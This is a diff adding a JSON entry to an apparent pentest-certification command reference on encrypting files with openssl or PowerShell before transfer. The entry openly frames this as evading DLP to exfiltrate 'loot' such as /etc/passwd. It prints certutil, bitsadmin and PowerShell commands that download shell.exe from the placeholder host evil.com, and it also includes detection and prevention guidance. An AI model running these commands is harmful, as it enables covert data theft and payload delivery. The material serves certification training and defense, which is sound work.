@@ -1,0 +1,96 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "openssl",
+    "powershell"
+  ],
+  "tags": [
+    "encryption",
+    "aes",
+    "openssl"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Encryption",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Encrypt a file with OpenSSL AES-256",
+      "command": "openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc"
+    }
+  ],
+  "notes": "Encrypt/encode files before moving them (openssl aes, gpg, or a password zip) so DLP/IDS and sniffers can't read loot in transit, and to slip past content inspection. Decrypt on the other end.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "nix-upload",
+      "rel": "next",
+      "note": "Exfil the encrypted blob."
+    },
+    {
+      "id": "evade-user-agent",
+      "rel": "alternative",
+      "note": "Blend the request in too."
+    }
+  ],
+  "id": "protected-transfer",
+  "name": "Protected Transfers - Encrypt Files",
+  "command": "openssl enc -aes256 -iter 100000 -pbkdf2 -in <file> -out <file>.enc",
+  "description": "Encrypt sensitive files before moving them so intercepted transfers are useless without the key. OpenSSL on Linux; Invoke-AESEncryption on Windows.",
+  "variations": [
+    {
+      "label": "OpenSSL encrypt / decrypt",
+      "command": "openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\nopenssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd"
+    },
+    {
+      "label": "PowerShell AES - file",
+      "command": "Import-Module .\\Invoke-AESEncryption.ps1\nInvoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\nInvoke-AESEncryption -Mode Decrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt.aes"
+    },
+    {
+      "label": "PowerShell AES - string",
+      "command": "Invoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\"\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"<base64>\""
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105",
+    "T1027"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Encrypting a file before transfer (Invoke-AESEncryption.ps1 on Windows, openssl on Linux) or using an encrypted channel (openssl s_server/s_client, ncat --ssl) prevents the payload being read or signatured if intercepted in transit (HTB M07: encrypt sensitive data like NTDS.dit).",
+    "prerequisites": "An encryption tool (openssl / Invoke-AESEncryption) on both ends and a transfer channel.",
+    "impact": "The transferred file's contents are unreadable to network inspection/DLP, defeating signature and content-based detection.",
+    "detection": "Detection shifts from payload to metadata: an encrypted flow to an unknown host, the openssl/encryption command line (auditd/4104), and the new file on disk; content inspection yields nothing.",
+    "artifacts": "openssl / Invoke-AESEncryption command lines; an encrypted connection; the .aes/encrypted file.",
+    "prevention": "[MITRE T1105 M1031] IDS/IPS and egress filtering by destination/flow (since payload is opaque); alert on unusual encrypted flows to unknown hosts; EDR on the encryption tooling and the decrypted output.",
+    "evasion": "This IS an evasion of content inspection/DLP; using a common TLS port and a valid-looking cert (openssl-generated) further blends the flow.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
